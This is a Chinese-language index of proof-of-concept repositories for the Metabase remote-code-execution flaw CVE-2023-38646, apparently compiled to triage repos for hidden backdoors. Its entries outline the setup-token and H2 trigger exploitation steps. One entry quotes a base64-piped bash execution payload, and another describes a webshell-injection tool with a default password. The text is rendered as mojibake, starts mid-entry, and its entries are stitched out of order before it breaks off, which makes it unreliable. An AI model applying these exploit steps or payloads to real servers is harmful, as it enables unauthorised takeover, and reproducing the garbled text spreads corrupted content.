PoC ä»£ç  `CVE-2023-38646-POC.py` ä¸»è¦åŠŸèƒ½æ˜¯å‘ç°æœªé…ç½®çš„ Metabase å®ä¾‹å¹¶è·å– setup tokenï¼Œæœ¬èº«æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä½†æ˜¯ï¼Œä¸èƒ½å®Œå…¨æ’é™¤å…¶ä½œè€…åœ¨ä»£ç ä¸­éšè—æ¶æ„ä»£ç çš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚åœ¨è·å– token åå°è¯•æ‰§è¡Œå…¶ä»–æ“ä½œï¼Œæˆ–è€…å°† token å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨ã€‚é£é™©è¯„ä¼°ä¸º 10%ã€‚

PoC ä»£ç  `CVE-2023-38646-Reverse-Shell.py` åŒæ ·æ˜¯æ¼æ´åˆ©ç”¨ç›¸å…³ï¼Œä¸»è¦æ¶‰åŠè·å–setup tokenç­‰ä¿¡æ¯ã€‚éœ€è¦äººå·¥å®¡è®¡è¯¥éƒ¨åˆ†ä»£ç ï¼Œè¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ä¿¡æ¯æ”¶é›†ï¼š** æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡ Metabase å®ä¾‹çš„ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ã€‚é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹å¯ä»¥è·å– Metabase ç‰ˆæœ¬ã€‚
2.  **è·å–Setup Token (å¦‚æœæœªè®¾ç½®):** å¦‚æœ Metabase å®ä¾‹å°šæœªå®Œæˆåˆå§‹åŒ–è®¾ç½®ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å– setup-tokenã€‚è¿™ä¸ªtokenå¯ä»¥ç”¨æ¥å®ŒæˆMetabaseçš„åˆå§‹åŒ–ã€‚
3.  **æ‰§è¡Œä»»æ„ä»£ç ï¼š**  åˆ©ç”¨è·å–çš„setup tokenæˆ–è€…å…¶ä»–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„è¯·æ±‚æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚å…·ä½“ RCE çš„åˆ©ç”¨æ–¹å¼å¯èƒ½æ¶‰åŠå¤šä¸ªæ­¥éª¤ï¼Œä¾‹å¦‚é€šè¿‡åˆ›å»ºä¸€ä¸ªæ¶æ„çš„æ•°æ®æºæˆ–ä»ªè¡¨æ¿ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚

æ€»è€Œè¨€ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨ç›¸å¯¹ç®€å•ï¼Œå±å®³æ€§æé«˜ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®Œå…¨æ§åˆ¶å—å½±å“çš„ Metabase æœåŠ¡å™¨ã€‚ 

**é¡¹ç›®åœ°å€:** [XiaomingX/cve-2023-38646-poc](https://github.com/XiaomingX/cve-2023-38646-poc)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #15

**æ¥æº**: [CVE-2023-38646-Zenmovie_CVE-2023-38646.md](../2023/CVE-2023-38646-Zenmovie_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ç‰ˆæœ¬ï¼Œ1.46.6.1ä¹‹å‰Enterpriseç‰ˆæœ¬ï¼Œä»¥åŠå…¶ä»–å—å½±å“çš„å›ºå®šç‰ˆæœ¬ä¹‹å‰çš„ç‰ˆæœ¬

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹å¯ä»æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§å¾ˆé«˜ã€‚

**æœ‰æ•ˆæ€§:**

*   æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æœç´¢å¼•æ“ç»“æœç¡®è®¤äº†è¯¥æ¼æ´çš„ä¸¥é‡æ€§ï¼Œå¹¶æä¾›äº†å¤šä¸ªå…³äºè¯¥æ¼æ´çš„æè¿°ã€å½±å“å’ŒæŠ€æœ¯ç»†èŠ‚çš„ç½‘é¡µé“¾æ¥ï¼ŒåŒ…æ‹¬PoCä»£ç çš„GitHubé“¾æ¥ã€‚
*   æä¾›çš„PoCä»£ç  (`CVE-2023-38646.py`) çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œå®ƒåˆ©ç”¨äº† Metabase çš„ `setup-token` å’Œ H2 æ•°æ®åº“çš„ç‰¹æ€§æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **è·å– Setup Token å’Œ Metabase ç‰ˆæœ¬:** PoC é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæ£€ç´¢ `setup-token` å’Œ Metabase ç‰ˆæœ¬ã€‚
2.  **æ„é€  Payload:**  æ„å»ºåå¼¹ shell çš„ payload, å¹¶å¯¹å…¶è¿›è¡Œ Base64 ç¼–ç ã€‚
3.  **æ„é€ Exploitæ•°æ®:** PoC æ„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON æ•°æ®ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ªåˆ©ç”¨ `CREATE TRIGGER` çš„ payloadï¼Œè¯¥è§¦å‘å™¨åœ¨ `INFORMATION_SCHEMA.TABLES` ä¸Šæ‰§è¡Œ `SELECT` æ“ä½œä¹‹å‰æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`token` å­—æ®µæ‹¼æ¥äº† setup token å’Œ base64 ç¼–ç åçš„ payloadã€‚
4.  **å‘é€æ¶æ„è¯·æ±‚:** PoC å‘ `/api/setup/validate` å‘é€å¸¦æœ‰æ„é€ çš„ JSON æ•°æ®çš„ POST è¯·æ±‚ã€‚è¿™ä¸ªè¯·æ±‚ä¼šè§¦å‘ H2 æ•°æ®åº“è¿æ¥å’Œè§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©:**

PoCä»£ç æœ¬èº«çš„åå¼¹shellè¿æ¥åœ°å€æ˜¯å¯ä»¥é…ç½®çš„, å¦‚æœä½œè€…æƒ³æŠ•æ¯’,å¯ä»¥å°†IPåœ°å€å†™æ­»,æˆ–è€…åŠ å…¥å…¶ä»–æ¶æ„æ“ä½œ.
*   æ¼æ´åˆ©ç”¨ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå…¶ç›®çš„æ˜¯æ˜ç¡®çš„ã€‚
*   `README.md` æ–‡ä»¶åªåŒ…å« PoC çš„åŸºæœ¬ä¿¡æ¯ã€‚

å› æ­¤ï¼Œè¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½, å¤§æ¦‚åœ¨10%å·¦å³ã€‚æŠ•æ¯’çš„ä¸»è¦é£é™©åœ¨äºæ¶æ„ä¿®æ”¹payloadï¼Œä¾‹å¦‚åå¼¹shellåœ°å€æˆ–è€…æ’å…¥å…¶ä»–çš„æ¶æ„æ“ä½œã€‚

**é¡¹ç›®åœ°å€:** [Zenmovie/CVE-2023-38646](https://github.com/Zenmovie/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #16

**æ¥æº**: [CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md](../2023/CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md)

# CVE-2023-38646

> ğŸ“¦ è¯¥CVEæœ‰ **27** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md](../2023/CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md)

## CVE-2023-38646 - Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯å…¬å¼€è®¿é—®æˆ–æ”»å‡»è€…ä½äºåŒä¸€ç½‘ç»œ

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œè·å¾—æœåŠ¡å™¨æƒé™ã€‚æ¼æ´å­˜åœ¨äº Metabase 0.46.6.1 ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ 1.46.6.1 ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æ ¹æ®æœç´¢ç»“æœï¼Œå·²ç»æœ‰å…¬å¼€çš„ PoC ä»£ç å¯ç”¨ (ä¾‹å¦‚ï¼Œgithub.com/threatHNTR/CVE-2023-38646)ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åŸºäº Assetnote çš„ä¸€ç¯‡å…³äºè¯¥æ¼æ´åˆ†æçš„æ–‡ç« ã€‚å®ƒé€šè¿‡åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥é…ç½®ä¸­æ‰§è¡Œæ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒé€šè¿‡æ„é€ ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥ URLï¼Œåœ¨è¿æ¥æ•°æ®åº“æ—¶è§¦å‘æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š

1.  **æ„é€ æ¶æ„ JSON Payload:**  è¯¥ JSON payload ç”¨äºåˆ›å»ºæˆ–ä¿®æ”¹ Metabase ä¸­çš„æ•°æ®åº“è¿æ¥ã€‚ å…¶ä¸­ `classname` è¢«è®¾ç½®ä¸º `org.h2.Driver` , `subname` åŒ…å«æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²,å­—ç¬¦ä¸²åˆ©ç”¨ H2 çš„ `CREATE TRIGGER` ç‰¹æ€§ï¼Œåœ¨INFORMATION_SCHEMA.TABLESä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨, è¯¥è§¦å‘å™¨ä¼šåœ¨æ¯æ¬¡æŸ¥è¯¢è¯¥è¡¨æ—¶æ‰§è¡ŒåµŒå…¥çš„ JavaScript ä»£ç , JavaScriptä»£ç è´Ÿè´£æ‰§è¡Œå‘½ä»¤.
2.  **å‘é€Payload:** é€šè¿‡å‘é€ POST è¯·æ±‚åˆ° Metabase API ç«¯ç‚¹ï¼ˆé€šå¸¸æ˜¯ /api/setup/validate æˆ–å…¶ä»–ç›¸å…³ç«¯ç‚¹ï¼‰ï¼Œå°†æ„é€ çš„ JSON payload å‘é€ç»™ Metabase æœåŠ¡å™¨ã€‚ç”±äºè¯¥æ¼æ´æ˜¯æœªç»èº«ä»½éªŒè¯çš„ï¼Œå› æ­¤æ— éœ€æä¾›ä»»ä½•èº«ä»½éªŒè¯ä¿¡æ¯ã€‚
3.  **è§¦å‘ RCE:** Metabase æœåŠ¡å™¨å°è¯•ä½¿ç”¨æä¾›çš„é…ç½®è¿æ¥åˆ° H2 æ•°æ®åº“æ—¶ï¼Œæ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ä¼šè¢«è§£æå’Œæ‰§è¡Œï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ PoC çš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºå¦‚ä½•åˆ©ç”¨è¯¥æ¼æ´ã€‚ åˆ†æä»£ç ï¼Œå‘ç°é«˜é£é™©çš„è¡Œä¸ºæ˜¯æ‰§è¡Œ `java.lang.Runtime.getRuntime().exec('bash -c {echo,BASE64COMMAND}|{base64,-d}|{bash,-i}')`ã€‚è¿™è¡Œä»£ç å…è®¸æ‰§è¡Œä»»æ„çš„ bash å‘½ä»¤ã€‚æŠ•æ¯’é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **å‘½ä»¤æ³¨å…¥é£é™©ï¼š**  è™½ç„¶ä»£ç ä¸­ä½¿ç”¨äº† Base64 ç¼–ç ï¼Œä½†æ”»å‡»è€…ä»ç„¶å¯èƒ½é€šè¿‡ä¿®æ”¹ Base64 ç¼–ç çš„å†…å®¹æ¥æ³¨å…¥æ¶æ„å‘½ä»¤ã€‚
*   **æƒé™æå‡é£é™©ï¼š**  ç”±äºä»£ç ä»¥ Metabase æœåŠ¡å™¨çš„æƒé™è¿è¡Œï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥æ¼æ´æå‡æƒé™ã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ä¸»è¦æ¥è‡ªäºå‘½ä»¤æ³¨å…¥çš„å¯èƒ½æ€§ï¼Œä½†è¿™å–å†³äºå¦‚ä½•ä½¿ç”¨å’Œä¿®æ”¹ PoCã€‚æ•´ä½“æŠ•æ¯’å¯èƒ½æ€§è¾ƒä½ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦1%ã€‚å› ä¸ºä½œè€…å·²ç»è¯´æ˜äº†è¿™æ˜¯ä¸€ä¸ªæ¼æ´çš„æ‰©å±•ï¼Œæ„åœ¨è§£å†³ä¸€äº›ç‰¹å®šæƒ…å†µä¸‹çš„åˆ©ç”¨é—®é¢˜ï¼Œå¹¶ä¸”ä¸»è¦ä»£ç é€»è¾‘æ˜¯åˆ©ç”¨å·²çŸ¥æ¼æ´ï¼Œè€Œä¸æ˜¯å¼•å…¥æ–°çš„ã€éšè”½çš„æ¶æ„ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [0utl4nder/Another-Metabase-RCE-CVE-2023-38646](https://github.com/0utl4nder/Another-Metabase-RCE-CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #2

**æ¥æº**: [CVE-2023-38646-AnvithLobo_CVE-2023-38646.md](../2023/CVE-2023-38646-AnvithLobo_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯é€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨å»ºç«‹æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œé¢„å…ˆè®¾å®šçš„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **è·å–Tokenï¼š** é¦–å…ˆï¼Œé€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å–ä¸€ä¸ªsetup tokenã€‚
2.  **æ„é€ Payloadï¼š**  ç„¶åï¼Œæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åˆ©ç”¨`CREATE TRIGGER`è¯­å¥åˆ›å»ºè§¦å‘å™¨ï¼Œåœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œå‰è§¦å‘ã€‚è§¦å‘å™¨æ‰§è¡Œçš„JavaScriptä»£ç ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
3.  **Base64ç¼–ç ï¼š** ä½¿ç”¨Base64å¯¹åå‘shellæŒ‡ä»¤è¿›è¡Œç¼–ç ï¼Œé¿å…ç‰¹æ®Šå­—ç¬¦å½±å“ã€‚
4.  **å‘é€Payloadï¼š**  æœ€åï¼Œå°†æ„é€ å¥½çš„JSON payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚

**æœ‰æ•ˆæ€§ï¼š**  æä¾›çš„PoCä»£ç æœ‰æ•ˆï¼Œå¯ä»¥æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ã€‚

**æŠ•æ¯’é£é™©ï¼š**  ä»£ç ä¸­æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è„šæœ¬çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å¹¶æ‰§è¡Œåå‘shellã€‚ä½œè€…æä¾›çš„ä»£ç é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ¶æ„ä»£ç ç‰‡æ®µæˆ–è€…éšè—çš„åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½ä¸æè¿°ä¸€è‡´ï¼Œç›®çš„æ˜¯åˆ©ç”¨Metabaseçš„æ¼æ´æ¥è·å–è¿œç¨‹ä»£ç æ‰§è¡Œæƒé™ã€‚å› æ­¤, æŠ•æ¯’é£é™©è¯„ä¼°ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [AnvithLobo/CVE-2023-38646](https://github.com/AnvithLobo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #3

**æ¥æº**: [CVE-2023-38646-Boogipop_MetabaseRceTools.md](../2023/CVE-2023-38646-Boogipop_MetabaseRceTools.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1, Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™çº§åˆ«ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼åˆ†æå¦‚ä¸‹ï¼š

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æœªæˆæƒè®¿é—®ï¼š** è¯¥æ¼æ´æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ã€‚
2.  **RCEï¼š**  æ”»å‡»è€…å¯ä»¥å‘é€ç‰¹åˆ¶çš„è¯·æ±‚ï¼Œæ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„ä»»æ„å‘½ä»¤ã€‚
3.  **å…·ä½“åˆ©ç”¨ï¼š** æ ¹æ®æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ”»å‡»æµç¨‹ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š
    *   **éªŒè¯æ¨¡å—ï¼š**  å‘`/api/session/properties`ç«¯ç‚¹å‘é€è¯·æ±‚ï¼Œè·å–æœªæˆæƒçš„tokenï¼Œç¡®è®¤æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚
    *   **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** åˆ©ç”¨ä¸Šä¸€æ­¥è·å–çš„tokenï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚éœ€è¦æŒ‡å®šmetabase.jarçš„ä½ç½®ã€‚
    *   **å†…å­˜é©¬æ³¨å…¥æ¨¡å—ï¼š** é€šè¿‡ä¿®æ”¹`x-client-data`è¯·æ±‚å¤´æ³¨å…¥å†…å­˜é©¬ï¼Œæ”¯æŒ cmd å’Œ godzilla ä¸¤ç§æ¨¡å¼ã€‚cmdæ¨¡å¼ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œgodzillaæ¨¡å¼åˆ™ç›´æ¥è¿æ¥å“¥æ–¯æ‹‰webshellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ª Metabase RCE å›¾å½¢åŒ–åˆ©ç”¨å·¥å…·ï¼ŒåŒ…å«äº†éªŒè¯æ¨¡å—ã€å‘½ä»¤æ‰§è¡Œæ¨¡å—å’Œå†…å­˜é©¬æ³¨å…¥æ¨¡å—ã€‚ä¸»è¦çš„æ½œåœ¨æŠ•æ¯’é£é™©å­˜åœ¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **å†…å­˜é©¬æ³¨å…¥ï¼š** å†…å­˜é©¬æ³¨å…¥æ¨¡å—æœ¬èº«å…·æœ‰è¾ƒé«˜çš„é£é™©ï¼Œå¯èƒ½è¢«ç”¨äºæ¤å…¥æ¶æ„ä»£ç ï¼Œé•¿æœŸæ§åˆ¶æœåŠ¡å™¨ã€‚ä»£ç ä¸­`x-client-data:godzilla`çš„æ–¹å¼è¿æ¥å“¥æ–¯æ‹‰webshellï¼Œé»˜è®¤å¯†ç ä¸ºpassï¼Œå¯èƒ½ä¼šè¢«å…¶ä»–äººåˆ©ç”¨ã€‚
2.  **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** è™½ç„¶å‘½ä»¤æ‰§è¡Œæ¨¡å—çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹è¯¥æ¨¡å—ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„è¡Œä¸ºï¼Œä¾‹å¦‚ä¸‹è½½å¹¶æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚

è€ƒè™‘åˆ°ä»¥ä¸Šé£é™©ï¼Œè¯¥POCå·¥å…·å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå°¤å…¶æ˜¯å†…å­˜é©¬æ¨¡å—ã€‚éœ€è¦åœ¨ä½¿ç”¨å‰è¿›è¡Œä»£ç å®¡è®¡ï¼Œç¡®ä¿æ²¡æœ‰æ¶æ„ä»£ç ã€‚

**é£é™©è¯„ä¼°ï¼š**

å°½ç®¡è¯¥å·¥å…·ç®€åŒ–äº†æ¼æ´åˆ©ç”¨è¿‡ç¨‹ï¼Œä½†ä½¿ç”¨å®ƒä¹Ÿå¯èƒ½å¼•å…¥é£é™©ã€‚ç”¨æˆ·åº”è°¨æ…ä½¿ç”¨æ­¤å·¥å…·ï¼Œå¹¶å……åˆ†äº†è§£å…¶æ½œåœ¨çš„å±å®³ã€‚å»ºè®®åœ¨éç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œå¹¶è¿›è¡Œå……åˆ†çš„å®‰å…¨æµ‹è¯•ã€‚

**é£é™©æ¦‚ç‡ï¼š**

è€ƒè™‘åˆ°å†…å­˜é©¬æ³¨å…¥çš„é£é™©ï¼Œä¸”è¯¥POCå·¥å…·ç”±ä¸ªäººå¼€å‘è€…æä¾›ï¼Œå¹¶éæ¥è‡ªå®˜æ–¹æˆ–ä¿¡èª‰è‰¯å¥½çš„å®‰å…¨å‚å•†ï¼Œå› æ­¤ç»¼åˆè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªäºå¯¹ä½¿ç”¨è€…ç¼ºä¹å®‰å…¨æ„è¯†ä»¥åŠå¯¹å·¥å…·çš„æœªçŸ¥æ€§å¯èƒ½å¸¦æ¥çš„é£é™©ï¼Œè€Œéä»£ç æœ¬èº«ä¸€å®šå­˜åœ¨æ¶æ„åé—¨ã€‚

**é¡¹ç›®åœ°å€:** [Boogipop/MetabaseRceTools](https://github.com/Boogipop/MetabaseRceTools)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #4

**æ¥æº**: [CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md](../2023/CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

